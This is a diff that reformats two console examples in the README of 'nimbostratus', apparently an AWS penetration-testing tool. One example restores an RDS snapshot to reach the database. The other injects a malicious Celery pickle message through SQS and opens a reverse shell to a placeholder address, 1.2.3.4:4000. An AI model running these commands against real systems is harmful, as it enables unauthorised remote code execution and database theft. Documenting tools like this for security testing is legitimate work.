@@ -84,7 +84,8 @@ don't have any access to the database itself (MySQL user). This tool allows you 
 that database by creating a snapshot and restoring it.
 
 ```console
-$ nimbostratus snapshot-rds --access-key=... --secret-key=... --password=changeme --rds-name==db_name
+$ nimbostratus snapshot-rds --access-key=... --secret-key=... \
+                            --password=changeme --rds-name==db_name
 ...
 ```
 
@@ -97,8 +98,9 @@ where this tool is being run has access to SQS, if that SQS has a Celery queue, 
 finally inject a raw message that will execute arbitrary commands when un-pickled.
 
 ```console
-$ nimbostratus celery-pickle-exploit --access-key=... --secret-key=... --queue-name=celery \
-                                     --region=ap-southeast-1 --reverse=1.2.3.4:4000
+$ nimbostratus celery-pickle-exploit --access-key=... --secret-key=... \
+                                     --queue-name=celery --region=ap-southeast-1 \
+                                     --reverse=1.2.3.4:4000
 ...
 ```
 
